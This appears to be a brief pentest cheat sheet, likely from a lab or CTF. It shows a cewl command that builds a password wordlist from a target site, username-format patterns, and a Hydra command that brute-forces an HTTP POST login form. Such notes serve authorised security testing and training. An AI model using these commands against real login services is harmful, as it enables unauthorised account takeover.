# Password & Hash


## Generate Password List (CEWL)

```
cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
```

## Generate Username Combinations like

```
firstlast
first.last
f.last
first.l
l.first
lfirst
first
last
```

https://github.com/m8sec/CrossLinked
https://github.com/soxoj/username-generation-guide

# Hydra
## http-post-form
```
hydra -I -f -L usernames.txt -P passwords.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
```
